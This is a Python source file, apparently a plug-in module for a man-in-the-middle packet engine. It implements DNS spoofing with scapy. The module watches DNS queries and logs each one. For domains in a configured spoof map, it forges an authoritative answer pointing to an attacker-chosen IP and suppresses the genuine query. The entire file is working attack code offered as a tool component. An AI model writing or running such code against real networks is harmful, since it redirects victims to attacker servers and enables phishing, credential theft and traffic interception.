from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP
from scapy.all import *
from scapy.sendrecv import sendp

from engine.modules.base import Module

class DNSModule(Module):
    def __init__(self):
        self.spoof_map = {}

    def add_spoof(self, domain, ip):
        self.spoof_map[domain] = ip

    def process(self, packet):
        if packet.haslayer(DNS) and packet[DNS].qr == 0:
            query_name = packet[DNSQR].qname.decode().rstrip(".")
            print(f"[DNS] Query: {query_name} from {packet[IP].src}")
            if query_name in self.spoof_map:
                spoof_ip = self.spoof_map[query_name]
                print(f"[DNS] Spoofing {query_name} -> {spoof_ip}")

                dns_response = Ether(dst=packet[Ether].src, src=packet[Ether].dst) / IP(src=packet[IP].dst, dst=packet[IP].src) / UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) / DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, ancount=1, an=DNSRR(type="A", rrname=packet[DNSQR].qname, ttl=300, rdata=spoof_ip))
                sendp(dns_response, verbose=False)
                return None  # Stop further processing to prevent sending the original
        return packet

